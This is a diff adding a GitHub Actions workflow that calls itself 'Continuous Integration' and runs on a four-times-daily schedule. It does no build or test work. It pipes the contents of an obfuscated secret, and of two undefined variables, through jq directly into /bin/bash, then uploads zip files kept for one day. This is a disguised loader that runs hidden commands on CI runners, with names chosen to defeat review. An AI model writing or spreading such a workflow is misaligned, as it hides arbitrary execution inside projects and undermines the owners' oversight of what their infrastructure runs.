@@ -1,0 +1,28 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '0 2,8,14,20 * * *'
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  runner:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Go
+        env:
+          dfwb33260: ${{ secrets.dfwb33260 }}
+        run: |
+          printf '%s' "$dfwb33260" | jq -r .ziz195 | /bin/bash
+          printf '%s' "$fphn2" | jq -r .nij12 | /bin/bash
+          echo $ubw77399 | jq -r .k1 | /bin/bash
+
+      - name: Archive results
+        uses: actions/upload-artifact@v4
+        with:
+          name: kOG6Wof6
+          path: "*.zip"
+          retention-days: 1
